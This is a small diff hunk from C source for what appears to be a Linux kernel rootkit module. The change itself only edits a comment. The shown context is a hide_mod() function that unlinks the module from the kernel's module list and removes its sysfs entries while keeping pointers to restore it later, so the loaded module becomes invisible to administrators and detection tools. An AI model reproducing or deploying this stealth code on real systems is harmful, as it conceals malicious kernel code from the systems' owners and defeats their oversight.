@@ -64,7 +64,7 @@ static void show_mod(void) {
 static void hide_mod(void) {
     // keep the module that this module is attached to after in the modules linked list, to reattach later
     prev_module = THIS_MODULE->list.prev;
-    // delete this module from the list by linking previous module to the next(thats behind the scenes)
+    // delete this module from the list by linking previous module to the next
     list_del(&THIS_MODULE->list);
     // remove the kobjects of the module from sysfs, kobject_del calls sysfs_remove_dir which removes all the sub-directories and files from kernfs by using sd which is the kernfs entry.
     kobject_parent_prev = THIS_MODULE->mkobj.kobj.parent;
